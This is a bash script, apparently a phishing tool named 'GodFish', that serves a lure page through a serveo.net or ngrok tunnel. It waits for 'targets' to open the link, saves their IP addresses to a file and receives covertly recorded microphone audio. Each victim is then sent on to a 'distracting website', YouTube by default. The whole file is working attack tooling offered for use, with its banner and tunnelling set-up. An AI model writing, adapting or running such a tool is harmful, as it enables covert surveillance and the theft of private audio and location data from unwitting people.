#!/bin/bash
# GodFish v1.0
# coded by: https://github.com/Hackerclown0
# maintained by: github.com/Hackerclown0
# Using Recorderjs by: https://github.com/mattdiamond/Recorderjs
trap 'printf "\n";stop' 2

null_redir="> /dev/null 2>&1"
verb_xterm=""
if [[ $# -eq 1 ]]; then
  null_redir=""
  verb_xterm="xterm -e"
fi

banner() {

printf "\e[1;92m   ...',;:;:::;;,,,,,;:ccccl::cccc:::;,,',:;:,;;;;;;;:ccold:c,;,;,;;;.;',.. ..           \e[0m\n"
printf "\e[1;92m       .:,   .''';;,;codool:;;,:clloxxocc::::oooc:,,cclcodxxxdolccdod::,,'c;;',.,';.  .. \e[0m\n"
printf "\e[1;92m       ':,...'..';,:cldkkkklcc;cldxkkkkcc;::ckkkoc,';:lxkkkkkkkkdclco::,:;c,'.,.'.'..... \e[0m\n"
printf "\e[1;92m      .;;....'.',;;:coxkkkkxll:llxkkkkkcoxxxxkkkOl:,::dkkkkxkkkkkolldlc,clc,'''.'....... \e[0m\n"
printf "\e[1;92m     .;:..',,',:;;;:coxkkkkkdolodkkkkkkxk0OOOkkk0xoclokkkxxdxxkkkdocolc,clo,,,,.'.'''... \e[0m\n"
printf "\e[1;92m   ..::'..,::;;llccccoxkkOkkxdlddkkkkkkxxOO00kkk0dlclokkkdddxdkkkooll::,:od;;,,',',;;.,, \e[0m\n"
printf "\e[1;92m   ',l:,''';:;,lolcc:oxkk0kkxdoookkOkkkdxO000kkk0oc:llkkkdxdddkkkllcc::,;ll,,,,,;,,,;,;; \e[0m\n"
printf "\e[1;92m   ..:'....'',,l:lcc:oxkkOOkkxdddkkOkkkxOKOO0kkkKxolookkkxxdolc:c::;;cllc;:'.','........ \e[0m\n"
printf "\e[1;92m    .,......'..::c;::dxkkOOkkxdxxkkOkkkodkkkkkkk0kxdxxkkkxdll;;',',':lol:;,..''......... \e[0m\n"
printf "\e[1;92m   ..'.. ..'.'.,,:,ccdxkkOOkkxxkkkkOkkkclloodkkkkoclookkkdoc:;c::,,,::c;;,...''.. ... .. \e[0m\n"
printf "\e[1;92m     ... . ..'...c,::oxkkkkkkkkOkkkkkkkcccccokkkxl:okkkkkklclokkkc:;;,,';.....'....,.    \e[0m\n"
printf "\e[1;92m     ..... ..'...:,::odkkOkkkkkOkkxxkkk::::cokkkkddllokkkxolookkkc:;,.'''... .'......    \e[0m\n"
printf "\e[1;92m        ...'.,...;'lcddkkkxxkkkkkkxdkkk:::cllkkkxko:clkkkdooddkkkc:;,''''.'...'.....     \e[0m\n"
printf "\e[1;92m       ....'.,...;';cdxkkxodxkkkkxdokkk:;;;clkkkdxc::cdkkkddxkkkx:::;''.',:;,,,.....  .. \e[0m\n"
printf "\e[1;92m       ..........:'';;okkdccokkkxlcckkk;;;;:lkkkl;:,,,;dkkkkkkkx:;;;'.'.'.;;,.'. ...  .. \e[0m\n"
printf "\e[1;92m       ..........c,'''cddl;::dddl:;;ddd',,':odxdc,....',cxkkkxo:;'..'.'.'... \e[0m\n"


printf "\e[1;77m v1.0 coded by github.com/Hackerclown0 [DELETED]\e[0m \n"
printf "\e[1;77m v1.0 maintained by https://github.com/Hackerclown0\e[0m \n"

printf " Instagram: @hackerclown.in\t @hackerclown.in\n"
printf " Author: sani kushwah\t Frontend web Developer\n"

}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
eval pkill -f -2 ngrok $null_redir
eval killall -2 ngrok $null_redir
fi

if [[ $checkphp == *'php'* ]]; then
eval killall -2 php $null_redir
fi
if [[ $checkssh == *'ssh'* ]]; then
eval killall -2 ssh $null_redir
fi
exit 1

}

dependencies() {

eval command -v php $null_redir || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }

}

catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt

}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Audio file received!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done

}

server() {
eval command -v ssh $null_redir || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }

printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"

if [[ $checkphp == *'php'* ]]; then
eval killall -2 php $null_redir
fi

if [[ $subdomain_resp == true ]]; then

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &

sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &

sleep 8
fi
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
eval fuser -k 3333/tcp $null_redir
eval php -S localhost:3333 $null_redir &
sleep 3
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
}

payload_ngrok() {

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' template.php > index.php
sed 's+redirect_link+'$redirect_link'+g' js/_app.js > js/app.js

}

ngrok_server() {


if [[ -e ngrok ]]; then
echo ""
else
eval command -v unzip $null_redir || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
eval command -v wget $null_redir || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
eval wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip $null_redir

if [[ -e ngrok-stable-linux-arm.zip ]]; then
eval unzip ngrok-stable-linux-arm.zip $null_redir
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else

eval wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip 2>&1 $null_redir

if [[ -e ngrok-stable-linux-386.zip ]]; then
eval unzip ngrok-stable-linux-386.zip $null_redir
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
eval php -S 127.0.0.1:3333 $null_redir &
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
eval $verb_xterm "./ngrok http 3333 $null_redir" &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z-]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link

payload_ngrok
checkfound
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"

default_redirect="https://youtube.com"
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a distracting website (Default:\e[0m\e[1;77m %s\e[0m\e[1;92m ): \e[0m" $default_redirect
read redirect_link
redirect_link="${redirect_link:-${default_redirect}}"

if [[ $option_server -eq 1 ]]; then

eval command -v php $null_redir || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
start

elif [[ $option_server -eq 2 ]]; then
ngrok_server
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
start1
fi

}


payload() {

send_link=$(grep -o "https://[0-9a-z-]*\.serveo.net" sendlink)

sed 's+forwarding_link+'$send_link'+g' template.php > index.php
sed 's+redirect_link+'$redirect_link'+g' js/_app.js > js/app.js

}

start() {

default_choose_sub="Y"
default_subdomain="sayhello$RANDOM"

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? \e[0m\e[1;77m [Y/n] \e[0m\e[1;33m: \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi

server
payload
checkfound

}

banner
dependencies
start1
